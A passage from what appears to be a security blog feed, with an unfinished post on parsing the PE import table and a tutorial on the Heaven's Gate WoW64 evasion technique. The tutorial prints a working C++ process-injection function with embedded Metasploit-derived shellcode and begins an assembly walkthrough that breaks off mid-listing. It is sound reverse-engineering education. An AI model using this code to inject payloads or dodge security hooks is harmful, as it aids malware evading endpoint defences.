</ul>
<p>Let&rsquo;s think how to obtain all the values:</p>
<ul>
<li><code>imageBase</code> in our case is 0 since the file is not loaded to memory and we are inspecting it on the disk.</li>
<li>Import table is located in a specific section of the binary. Since the binary is not loaded to disk, we need to know the file offset of the section that the import directory is in relation to the <code>imageBase</code>.</li>
<li><code>imageBase + text.RawOffset</code> gives us the file offset to the <code>.text</code> section - we need it, because remember - the import table is inside the <code>.text</code> section</li>
<li>Since <code>importDirectory.RVA</code>, as mentioned earlier, lives in a section, <code>importDirectory.RVA - text.VA</code> gives us the offset of the import table relative to the start of the <code>.text</code> section</li>
<li>We take the value of <code>importDirectory.RVA - text.VA</code> and add it to the <code>text.RawOffset</code> and we get the offset of the import table in the raw section data. <strong>After that, we can start parsing the Import Directory.</strong></li>
</ul>
<p>It consists of an array of <code>IMAGE_IMPORT_DESCRIPTOR</code> structures, each one of them is for a DLL.<br>
It doesn’t have a fixed size, so the last <code>IMAGE_IMPORT_DESCRIPTOR</code> of the array is zeroed-out (NULL-Padded) to indicate the end of the Import Directory Table.</p>
<p><code>IMAGE_IMPORT_DESCRIPTOR</code> is defined as follows:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-cpp" data-lang="cpp"><span style="display:flex;"><span><span style="color:#66d9ef">typedef</span> <span style="color:#66d9ef">struct</span> <span style="color:#a6e22e">_IMAGE_IMPORT_DESCRIPTOR</span> {
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">union</span> {
</span></span><span style="display:flex;"><span>        DWORD   Characteristics;
</span></span><span style="display:flex;"><span>        DWORD   OriginalFirstThunk;
</span></span><span style="display:flex;"><span>    } DUMMYUNIONNAME;
</span></span><span style="display:flex;"><span>    DWORD   TimeDateStamp;
</span></span><span style="display:flex;"><span>    DWORD   ForwarderChain;
</span></span><span style="display:flex;"><span>    DWORD   Name;
</span></span><span style="display:flex;"><span>    DWORD   FirstThunk;
</span></span><span style="display:flex;"><span>} IMAGE_IMPORT_DESCRIPTOR;
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">typedef</span> IMAGE_IMPORT_DESCRIPTOR UNALIGNED <span style="color:#f92672">*</span>PIMAGE_IMPORT_DESCRIPTOR;
</span></span></code></pre></div><h2 id="get-dll-name">Get DLL name</h2>
<p>We need to get the <code>Name RVA</code> (name does not point to the name, but contains a RVA) to a file offset using the technique we used earlier to get the location of the DLL name string.
This time the formula we need to use is:</p>
<pre tabindex="0"><code>offset = imageBase + text.RawOffset + (nameRVA − section.VA)
</code></pre><p>Where <code>nameRVA</code> is <code>Name RVA</code> value for ADVAPI32.dll from the Import Directory and <code>text.VA</code> is the <code>Virtual Address</code> of the <code>.text</code> section.</p>
<h2 id="get-dll-import-address-table-imported-functions">Get DLL Import Address Table (imported functions)</h2>
<p>TBD</p>
]]></description>
      
    </item>
    
    
    
    <item>
      <title>Understanding Heaven´s Gate</title>
      <link>http://localhost:1313/posts/wow64/</link>
      <pubDate>Thu, 19 Sep 2024 20:53:30 +0100</pubDate>
      
      <guid>http://localhost:1313/posts/wow64/</guid>
      <description><![CDATA[<h1 id="heavens-gate-lore">Heaven&rsquo;s gate lore</h1>
<p>The Heaven&rsquo;s Gate tutorial was written by an anonymous hacker going online as Roy G. Biv, a member of a group called 29A.
After the group disbanded and their e-zine&rsquo;s site went down, the Heaven&rsquo;s Gate technique was later <a href="https://github.com/darkspik3/Valhalla-ezines/blob/master/Valhalla%20%231/articles/HEAVEN.TXT">reprinted in the 2009 edition of the Valhalla hacker e-zine</a>. I personally would check this resource, as it was the first time the technique was commented.</p>
<h1 id="why-does-heavens-gate-exist">Why does Heaven&rsquo;s gate exist?</h1>
<p>In a normal environment, we have 64-bit Windows operative systems (or at least, we expect so). Some detection mechanisms, like antivirus software and OS security features, <strong>do not detect a 32-bit process jumping from running 32-bit compatible code to 64-bit code.</strong> And this is because a 32-bit program cannot inject code into 64-bit programs natively.
Indeed, 32-bit programs can run on a 64-bit OS because there is a compatibility layer: <strong>WoW64</strong>.</p>
<h2 id="the-compatibility-layer-wow64">The compatibility layer: WoW64</h2>
<p>In a 64-bit Windows kernel, the first piece of code to execute in <strong>any</strong> process is <strong>always</strong> the 64-bit DLL called <strong>ntdll.dll</strong>, also called NTDLL.
This DLL takes care of <strong>initializing the process in user-mode as a 64-bit process</strong> and setting up the execution of the process.</p>
<p><strong>But, what happens when a 64-bit Windows kernel runs a 32-bit process?</strong> How does Windows allow that kind of compatibility?
Well, after NTDLL is loaded, the <strong>Windows on Windows (WoW64)</strong> interface takes over and <strong>loads a 32-bit version of ntdll.dll, called ntdll32.dll</strong>. After loading this DLL, the execution <strong>turns into a 32-bit mode through a far jump to a compatibility code segment</strong> that changes the processor context to work to 32 bits for this process. From now on, for that process, its environment (registers, instructions) is 32-bit. Nevertheless, the kernel is still 64 bit so, <strong>when the process has to perform a syscall (and interact with the kernel space)</strong> the 32-bit NTDLL that was loaded <strong>changes the execution environment to 64-bit mode, executes the 64-bit syscall (calling the 64-bit NTDLL)</strong>, and, once the <em>syscall</em> is performed ntdll32.dll returns the process to 32-bit mode. We can think of ntdll32.dll as a &ldquo;proxy&rdquo; so that the processor runs 32-bit code and 64-bit code when necessary (this is mainly when executing <em>syscalls</em>) in a 64-bit operative system.</p>
<p>This process is better described in <a href="http://download.microsoft.com/download/3/a/9/3a9ad58f-5634-4cdd-8528-c78754d712e8/28-dw04040_winhec2004.ppt">many</a> <a href="https://msdn.microsoft.com/en-us/library/windows/desktop/aa384274(v=vs.85).aspx">sources</a>, including in the <a href="https://www.safaribooksonline.com/library/view/windows-internals-fifth/9780735625303/ch03s08.html">Windows Internals books</a>, so if you’re interested in reading more, you can do so, but I’ll try to do my best here.</p>
<h1 id="but-what-is-wrong-with-heavens-gate">But, what is wrong with Heaven&rsquo;s Gate?</h1>
<p>Besides the fact that this technique is pretty old (I think this is the <a href="https://github.com/darkspik3/Valhalla-ezines/blob/master/Valhalla%20%231/articles/HEAVEN.TXT">original post</a> which has been since 2008), it has been used in a lot of malware campaigns, like <a href="https://blogs.blackberry.com/en/2023/01/emotet-returns-with-new-methods-of-evasion">Emotet</a>, a banking trojan. For example, the Emotet malware uses Heaven&rsquo;s Gate to perform process hollowing (another malware technique) <strong>from a 32-bit process to a 64-bit process</strong>.</p>
<p><strong>But why is this used?</strong> Well, this technique is used to <strong>bypass the WoW64 API hooks</strong> performed by the security solutions. While a 32-bit process would normally <strong>pass through the 32-bit API hooks</strong> made by the 32-bit NTDLL.dll (which are the ones monitored by the security solutions), malicious programs can <strong>perform a jump instruction past these hooks in order to execute 64-bit code</strong> from a 32-bit process without having to trigger the API call, which is hooked by the security solutions. Overall, <strong>this is used as an evasion mechanism.</strong></p>
<p>Windows initially developed this on the assumption that the 64-bit ntdll.dll could not be accessed by a 32-bit process, but Heaven’s Gate takes advantage of this by running x64 instructions which will be completely missed by any application expecting x86 instructions.</p>
<p>Also, this technique is used to difficult the analysis of the malware samples, as it makes the debugging and emulation harder (and the <em>reversing</em> process of these samples overall).</p>
<h2 id="analyzing-a-heavens-gate-implementation">Analyzing a Heaven&rsquo;s Gate implementation</h2>
<p>There are a lot of different implementations of this technique, but they have 90% of the code in common. I will analyze the Heaven&rsquo;s Gate implementation used in the Metasploit Framework, as it is offered as a C++ function.</p>
<p>The Meterpreter shell <a href="https://github.com/rapid7/meterpreter/blob/5e24206d510a48db284d5f399a6951cd1b4c754b/source/common/arch/win/i386/base_inject.c">has a functionality to inject 64-bit code in 64-bit processes from 32-bit meterpreter shells</a>. I use a slightly modified code to <strong>perform the Heaven&rsquo;s Gate, call CreateRemoteThread with a 64-bit shellcode in order to inject 64-bit code from a 32-bit process to a 64-bit code</strong>. My code is the following:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c++" data-lang="c++"><span style="display:flex;"><span><span style="color:#75715e">// Definitions used for running native x64 code from a wow64 process
</span></span></span><span style="display:flex;"><span><span style="color:#75715e">// (src: https://github.com/rapid7/meterpreter/blob/5e24206d510a48db284d5f399a6951cd1b4c754b/source/common/arch/win/i386/base_inject.h)
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#66d9ef">typedef</span> <span style="color:#a6e22e">BOOL</span> (WINAPI <span style="color:#f92672">*</span> X64FUNCTION)( DWORD dwParameter );
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">typedef</span> <span style="color:#a6e22e">DWORD</span> (WINAPI <span style="color:#f92672">*</span> EXECUTEX64)( X64FUNCTION pFunction, DWORD dwParameter );
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">int</span> <span style="color:#a6e22e">InjectWOW64</span>(HANDLE hProc, <span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">char</span> <span style="color:#f92672">*</span> payload, <span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">int</span> payload_len) {
</span></span><span style="display:flex;"><span><span style="color:#75715e">//	src: https://github.com/rapid7/meterpreter/blob/5e24206d510a48db284d5f399a6951cd1b4c754b/source/common/arch/win/i386/base_inject.c
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>
</span></span><span style="display:flex;"><span>	LPVOID pRemoteCode <span style="color:#f92672">=</span> NULL;
</span></span><span style="display:flex;"><span>	EXECUTEX64 pExecuteX64   <span style="color:#f92672">=</span> NULL;
</span></span><span style="display:flex;"><span>	X64FUNCTION pX64function <span style="color:#f92672">=</span> NULL;
</span></span><span style="display:flex;"><span>	WOW64CONTEXT <span style="color:#f92672">*</span> ctx       <span style="color:#f92672">=</span> NULL;
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#75715e">/*
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"> A simple function to execute native x64 code from a wow64 (x86) process. 
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"> Can be called from C using the following prototype:
</span></span></span><span style="display:flex;"><span><span style="color:#75715e">     typedef DWORD (WINAPI * EXECUTEX64)( X64FUNCTION pFunction, DWORD dwParameter );
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"> The native x64 function you specify must be in the following form (as well as being x64 code):
</span></span></span><span style="display:flex;"><span><span style="color:#75715e">     typedef BOOL (WINAPI * X64FUNCTION)( DWORD dwParameter );
</span></span></span><span style="display:flex;"><span><span style="color:#75715e">
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"> Original binary:
</span></span></span><span style="display:flex;"><span><span style="color:#75715e">    src: https://github.com/rapid7/metasploit-framework/blob/master/external/source/shellcode/windows/x86/src/migrate/executex64.asm
</span></span></span><span style="display:flex;"><span><span style="color:#75715e">	src: https://github.com/rapid7/metasploit-framework/blob/master/external/source/shellcode/windows/x64/src/migrate/remotethread.asm
</span></span></span><span style="display:flex;"><span><span style="color:#75715e">*/</span>
</span></span><span style="display:flex;"><span>	BYTE sh_executex64[] <span style="color:#f92672">=</span>	<span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x55\x89\xE5\x56\x57\x8B\x75\x08\x8B\x4D\x0C\xE8\x00\x00\x00\x00</span><span style="color:#e6db74">&#34;</span>
</span></span><span style="display:flex;"><span>							<span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x58\x83\xC0\x2B\x83\xEC\x08\x89\xE2\xC7\x42\x04\x33\x00\x00\x00</span><span style="color:#e6db74">&#34;</span>
</span></span><span style="display:flex;"><span>							<span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x89\x02\xE8\x0F\x00\x00\x00\x66\x8C\xD8\x66\x8E\xD0\x83\xC4\x14</span><span style="color:#e6db74">&#34;</span>
</span></span><span style="display:flex;"><span>							<span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x5F\x5E\x5D\xC2\x08\x00\x8B\x3C\xE4\xFF\x2A\x48\x31\xC0\x57\xFF</span><span style="color:#e6db74">&#34;</span>
</span></span><span style="display:flex;"><span>							<span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\xD6\x5F\x50\xC7\x44\x24\x04\x23\x00\x00\x00\x89\x3C\x24\xFF\x2C</span><span style="color:#e6db74">&#34;</span>
</span></span><span style="display:flex;"><span>							<span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x24</span><span style="color:#e6db74">&#34;</span>;
</span></span><span style="display:flex;"><span>	BYTE sh_wownativex[] <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\xFC\x48\x89\xCE\x48\x89\xE7\x48\x83\xE4\xF0\xE8\xC8\x00\x00\x00</span><span style="color:#e6db74">&#34;</span>
</span></span><span style="display:flex;"><span>							<span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x41\x51\x41\x50\x52\x51\x56\x48\x31\xD2\x65\x48\x8B\x52\x60\x48</span><span style="color:#e6db74">&#34;</span>
</span></span><span style="display:flex;"><span>							<span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x8B\x52\x18\x48\x8B\x52\x20\x48\x8B\x72\x50\x48\x0F\xB7\x4A\x4A</span><span style="color:#e6db74">&#34;</span>
</span></span><span style="display:flex;"><span>							<span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x4D\x31\xC9\x48\x31\xC0\xAC\x3C\x61\x7C\x02\x2C\x20\x41\xC1\xC9</span><span style="color:#e6db74">&#34;</span>
</span></span><span style="display:flex;"><span>							<span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x0D\x41\x01\xC1\xE2\xED\x52\x41\x51\x48\x8B\x52\x20\x8B\x42\x3C</span><span style="color:#e6db74">&#34;</span>
</span></span><span style="display:flex;"><span>							<span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x48\x01\xD0\x66\x81\x78\x18\x0B\x02\x75\x72\x8B\x80\x88\x00\x00</span><span style="color:#e6db74">&#34;</span>
</span></span><span style="display:flex;"><span>							<span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x00\x48\x85\xC0\x74\x67\x48\x01\xD0\x50\x8B\x48\x18\x44\x8B\x40</span><span style="color:#e6db74">&#34;</span>
</span></span><span style="display:flex;"><span>							<span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x20\x49\x01\xD0\xE3\x56\x48\xFF\xC9\x41\x8B\x34\x88\x48\x01\xD6</span><span style="color:#e6db74">&#34;</span>
</span></span><span style="display:flex;"><span>							<span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x4D\x31\xC9\x48\x31\xC0\xAC\x41\xC1\xC9\x0D\x41\x01\xC1\x38\xE0</span><span style="color:#e6db74">&#34;</span>
</span></span><span style="display:flex;"><span>							<span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x75\xF1\x4C\x03\x4C\x24\x08\x45\x39\xD1\x75\xD8\x58\x44\x8B\x40</span><span style="color:#e6db74">&#34;</span>
</span></span><span style="display:flex;"><span>							<span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x24\x49\x01\xD0\x66\x41\x8B\x0C\x48\x44\x8B\x40\x1C\x49\x01\xD0</span><span style="color:#e6db74">&#34;</span>
</span></span><span style="display:flex;"><span>							<span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x41\x8B\x04\x88\x48\x01\xD0\x41\x58\x41\x58\x5E\x59\x5A\x41\x58</span><span style="color:#e6db74">&#34;</span>
</span></span><span style="display:flex;"><span>							<span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x41\x59\x41\x5A\x48\x83\xEC\x20\x41\x52\xFF\xE0\x58\x41\x59\x5A</span><span style="color:#e6db74">&#34;</span>
</span></span><span style="display:flex;"><span>							<span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x48\x8B\x12\xE9\x4F\xFF\xFF\xFF\x5D\x4D\x31\xC9\x41\x51\x48\x8D</span><span style="color:#e6db74">&#34;</span>
</span></span><span style="display:flex;"><span>							<span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x46\x18\x50\xFF\x76\x10\xFF\x76\x08\x41\x51\x41\x51\x49\xB8\x01</span><span style="color:#e6db74">&#34;</span>
</span></span><span style="display:flex;"><span>							<span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x00\x00\x00\x00\x00\x00\x00\x48\x31\xD2\x48\x8B\x0E\x41\xBA\xC8</span><span style="color:#e6db74">&#34;</span>
</span></span><span style="display:flex;"><span>							<span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x38\xA4\x40\xFF\xD5\x48\x85\xC0\x74\x0C\x48\xB8\x00\x00\x00\x00</span><span style="color:#e6db74">&#34;</span>
</span></span><span style="display:flex;"><span>							<span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x00\x00\x00\x00\xEB\x0A\x48\xB8\x01\x00\x00\x00\x00\x00\x00\x00</span><span style="color:#e6db74">&#34;</span>
</span></span><span style="display:flex;"><span>							<span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x48\x83\xC4\x50\x48\x89\xFC\xC3</span><span style="color:#e6db74">&#34;</span>;
</span></span><span style="display:flex;"><span>							
</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">int</span> sh_executex64_len <span style="color:#f92672">=</span> <span style="color:#66d9ef">sizeof</span>(sh_executex64);
</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">int</span> sh_wownativex_len <span style="color:#f92672">=</span> <span style="color:#66d9ef">sizeof</span>(sh_wownativex);
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>	<span style="color:#75715e">// inject payload into target process
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>	pRemoteCode <span style="color:#f92672">=</span> VirtualAllocEx(hProc, NULL, payload_len, MEM_COMMIT, PAGE_EXECUTE_READ);
</span></span><span style="display:flex;"><span>	WriteProcessMemory(hProc, pRemoteCode, (PVOID) payload, (SIZE_T) payload_len, (SIZE_T <span style="color:#f92672">*</span>) NULL);
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>	printf(<span style="color:#e6db74">&#34;remcode = %p</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>, pRemoteCode); getchar();
</span></span><span style="display:flex;"><span>	
</span></span><span style="display:flex;"><span>	<span style="color:#75715e">// alloc a RW buffer in this process for the EXECUTEX64 function
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>	pExecuteX64 <span style="color:#f92672">=</span> (EXECUTEX64)VirtualAlloc( NULL, <span style="color:#66d9ef">sizeof</span>(sh_executex64), MEM_RESERVE<span style="color:#f92672">|</span>MEM_COMMIT, PAGE_READWRITE );
</span></span><span style="display:flex;"><span>	<span style="color:#75715e">// alloc a RW buffer in this process for the X64FUNCTION function (and its context)
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>	pX64function <span style="color:#f92672">=</span> (X64FUNCTION)VirtualAlloc( NULL, <span style="color:#66d9ef">sizeof</span>(sh_wownativex)<span style="color:#f92672">+</span><span style="color:#66d9ef">sizeof</span>(WOW64CONTEXT), MEM_RESERVE<span style="color:#f92672">|</span>MEM_COMMIT, PAGE_READWRITE );
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>	<span style="color:#75715e">// printf(&#34;pExecuteX64 = %p ; pX64function = %p\n&#34;, pExecuteX64, pX64function); getchar();
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>
</span></span><span style="display:flex;"><span>	<span style="color:#75715e">// copy over the wow64-&gt;x64 stub
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>	memcpy( pExecuteX64, sh_executex64, sh_executex64_len );
</span></span><span style="display:flex;"><span>	VirtualAlloc( pExecuteX64, <span style="color:#66d9ef">sizeof</span>(sh_executex64), MEM_COMMIT, PAGE_EXECUTE_READ );
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>	<span style="color:#75715e">// copy over the native x64 function
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>	memcpy( pX64function, sh_wownativex, sh_wownativex_len );
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>	<span style="color:#75715e">// pX64function shellcode modifies itself during the runtime, so memory has to be RWX
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>	VirtualAlloc( pX64function, <span style="color:#66d9ef">sizeof</span>(sh_wownativex)<span style="color:#f92672">+</span><span style="color:#66d9ef">sizeof</span>(WOW64CONTEXT), MEM_COMMIT, PAGE_EXECUTE_READWRITE );
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>	<span style="color:#75715e">// set the context
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>	ctx <span style="color:#f92672">=</span> (WOW64CONTEXT <span style="color:#f92672">*</span>)( (BYTE <span style="color:#f92672">*</span>)pX64function <span style="color:#f92672">+</span> sh_wownativex_len );
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>	ctx<span style="color:#f92672">-&gt;</span>h.hProcess       <span style="color:#f92672">=</span> hProc;
</span></span><span style="display:flex;"><span>	ctx<span style="color:#f92672">-&gt;</span>s.lpStartAddress <span style="color:#f92672">=</span> pRemoteCode;
</span></span><span style="display:flex;"><span>	ctx<span style="color:#f92672">-&gt;</span>p.lpParameter    <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>;
</span></span><span style="display:flex;"><span>	ctx<span style="color:#f92672">-&gt;</span>t.hThread        <span style="color:#f92672">=</span> NULL;
</span></span><span style="display:flex;"><span>	
</span></span><span style="display:flex;"><span>	<span style="color:#75715e">// run a new thread in target process
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>	pExecuteX64( pX64function, (DWORD)ctx );
</span></span><span style="display:flex;"><span>	
</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">if</span>( ctx<span style="color:#f92672">-&gt;</span>t.hThread ) {
</span></span><span style="display:flex;"><span>		<span style="color:#75715e">// if success, resume the thread -&gt; execute payload
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>		ResumeThread(ctx<span style="color:#f92672">-&gt;</span>t.hThread);
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>		<span style="color:#75715e">// cleanup in target process
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>		VirtualFree(pExecuteX64, <span style="color:#ae81ff">0</span>, MEM_RELEASE);
</span></span><span style="display:flex;"><span>		VirtualFree(pX64function, <span style="color:#ae81ff">0</span>, MEM_RELEASE);
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>		<span style="color:#66d9ef">return</span> <span style="color:#ae81ff">0</span>;
</span></span><span style="display:flex;"><span>	}
</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">else</span>
</span></span><span style="display:flex;"><span>		<span style="color:#66d9ef">return</span> <span style="color:#ae81ff">1</span>;
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></div><p>This function receives:</p>
<ul>
<li>The handle to the 64 bit process to inject the 64-bit shellcode.</li>
<li>The 64-bit shellcode.</li>
<li>The size of the shellcode.</li>
</ul>
<p>Then, the steps to execute the 64-bit shellcode in the 64-bit target process are the following:</p>
<ul>
<li>Allocate memory space in the target process and copy the 64-bit shellcode for further execution.</li>
<li>In the 32-bit process, a RW buffer is allocated for the EXECUTEX64 function. <strong>This is the function that performs THE TRANSITION FROM 32-bit to 64-bit space, calls X64FUNCTION (we will see what this is in a moment) and returns from 64-bit to 32-bit space.</strong></li>
<li>In the 32-bit process, a RW buffer is allocated for for the X64FUNCTION function (and its context). <strong>This function is basically the 64-bit shellcode of CreateRemoteThread, as we want to create a thread in the remote process with our shellcode as the starting point</strong>.</li>
<li>We change the memory properties of the X64FUNCTION function zone (the CreateRemoteThread) as it modifies itself during runtime.</li>
<li>We run a new thread in the target process using the EXECUTE64 function, passing the address of the memory we allocated in the first step (therefore, pointing to the shellcode we want to execute).</li>
<li>Resume the thread (the thread is created in suspended state, as the flag CREATE_SUSPENDED is used in the shellcode that runs the thread).</li>
<li>Free the memory in the 32-bit process as it is no longer needed.</li>
</ul>
<p>Note that we could <strong>have a modified version of this function so that the 64-bit function that is executed is not CreateRemoteThread</strong>, but a Windows API call (for example), or an arbitrary 64-bit function shellcode.</p>
<h2 id="disassembling-and-analyzing-execute64">Disassembling and analyzing EXECUTE64</h2>
<p>We want to analyze the <strong>protagonist of this technique: the EXECUTE64 shellcode, which acts as the function that performs the &ldquo;jump&rdquo; to the 32-bit world to the 64-bit world and executes our function.</strong> This is the function that performs the Heaven&rsquo;s Gate, so it is the interesting one.</p>
<p>We could use a <a href="https://defuse.ca/online-x86-assembler.htm">known online disassembler</a> and copy the <code>sh_executex64</code> shellcode that is in the code, but we could also take the official ASM that is <a href="https://github.com/rapid7/metasploit-framework/blob/master/external/source/shellcode/windows/x86/src/migrate/executex64.asm">declared in the Metasploit Framework</a> that is basically the same code, but in ASM representation. It will be easier for us to comment.</p>
<p>Let&rsquo;s analyze the code:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c++" data-lang="c++"><span style="display:flex;"><span>; A simple function to execute native x64 code from a <span style="color:#a6e22e">wow64</span> (x86) process. 
</span></span><span style="display:flex;"><span>; Can be called from C <span style="color:#66d9ef">using</span> the following prototype:
</span></span><span style="display:flex;"><span>;     <span style="color:#66d9ef">typedef</span> <span style="color:#a6e22e">DWORD</span> (WINAPI <span style="color:#f92672">*</span> EXECUTEX64)( X64FUNCTION pFunction, DWORD dwParameter );
</span></span><span style="display:flex;"><span>; The native x64 function you specify must be in the following <span style="color:#a6e22e">form</span> (as well as being x64 code)<span style="color:#f92672">:</span>
</span></span><span style="display:flex;"><span>;     <span style="color:#66d9ef">typedef</span> <span style="color:#a6e22e">BOOL</span> (WINAPI <span style="color:#f92672">*</span> X64FUNCTION)( DWORD dwParameter );
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>; Clobbers: EAX, ECX and EDX (ala the normal stdcall calling convention)
</span></span><span style="display:flex;"><span>; Un<span style="color:#f92672">-</span>Clobbered: EBX, ESI, EDI, ESP and EBP can be expected to remain un<span style="color:#f92672">-</span>clobbered.
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>[BITS <span style="color:#ae81ff">32</span>]
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>WOW64_CODE_SEGMENT	EQU <span style="color:#ae81ff">0x23</span>
</span></span><span style="display:flex;"><span>X64_CODE_SEGMENT	EQU <span style="color:#ae81ff">0x33</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>start:
</span></span><span style="display:flex;"><span>	push ebp 								; Stack prologue, save EBP
</span></span><span style="display:flex;"><span>	mov ebp, esp							; Create a <span style="color:#66d9ef">new</span> stack frame
</span></span><span style="display:flex;"><span>	push esi								; Save the registers we shouldn<span style="color:#960050;background-color:#1e0010">&#39;</span>t clobber
</span></span><span style="display:flex;"><span>	push edi								;
</span></span><span style="display:flex;"><span>	mov esi, [ebp<span style="color:#f92672">+</span><span style="color:#ae81ff">8</span>]						; ESI <span style="color:#f92672">=</span> pFunction
</span></span><span style="display:flex;"><span>	mov ecx, [ebp<span style="color:#f92672">+</span><span style="color:#ae81ff">12</span>]						; ECX <span style="color:#f92672">=</span> dwParameter
</span></span><span style="display:flex;"><span>	call delta								;
</span></span><span style="display:flex;"><span>delta:
</span></span><span style="display:flex;"><span>	pop eax									;
</span></span><span style="display:flex;"><span>	add eax, (native_x64<span style="color:#f92672">-</span>delta)				; get the address of native_x64
</span></span><span style="display:flex;"><span>	
</span></span><span style="display:flex;"><span>	sub esp, <span style="color:#ae81ff">8</span>								; alloc some space on stack <span style="color:#66d9ef">for</span> far jump
</span></span><span style="display:flex;"><span>	mov edx, esp							; EDX will be pointer our far jump
</span></span><span style="display:flex;"><span>	mov dword [edx<span style="color:#f92672">+</span><span style="color:#ae81ff">4</span>], X64_CODE_SEGMENT		; set the native x64 code segment
</span></span><span style="display:flex;"><span>	mov dword [edx], eax					; set the address we want to jump <span style="color:#a6e22e">to</span> (native_x64)
</span></span><span style="display:flex;"><span>	
</span></span><span style="display:flex;"><span>	call go_all_native						; perform the transition into native x64 and <span style="color:#66d9ef">return</span> here when done.
</span></span><span style="display:flex;"><span>	
</span></span><span style="display:flex;"><span>	mov ax, ds								; fixes an elusive bug on AMD CPUs, http:<span style="color:#75715e">//blog.rewolf.pl/blog/?p=1484
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>	mov ss, ax								; found and fixed by ReWolf, incorporated by RaMMicHaeL
</span></span><span style="display:flex;"><span>	
</span></span><span style="display:flex;"><span>	add esp, (<span style="color:#ae81ff">8</span><span style="color:#f92672">+</span><span style="color:#ae81ff">4</span><span style="color:#f92672">+</span><span style="color:#ae81ff">8</span>)						; remove the <span style="color:#ae81ff">8</span> bytes we allocated <span style="color:#f92672">+</span> the <span style="color:#66d9ef">return</span> address which was never popped off <span style="color:#f92672">+</span> the qword pushed from native_x64
</span></span><span style="display:flex;"><span>	pop edi									; restore the clobbered registers
</span></span><span style="display:flex;"><span>	pop esi									;
</span></span><span style="display:flex;"><span>	pop ebp									; restore EBP
</span></span><span style="display:flex;"><span>	<span style="color:#a6e22e">retn</span> (<span style="color:#ae81ff">4</span><span style="color:#f92672">*</span><span style="color:#ae81ff">2</span>)								; <span style="color:#66d9ef">return</span> to <span style="color:#a6e22e">caller</span> (cleaning up our two function params)
</span></span><span style="display:flex;"><span>	
</span></span><span style="display:flex;"><span>go_all_native:
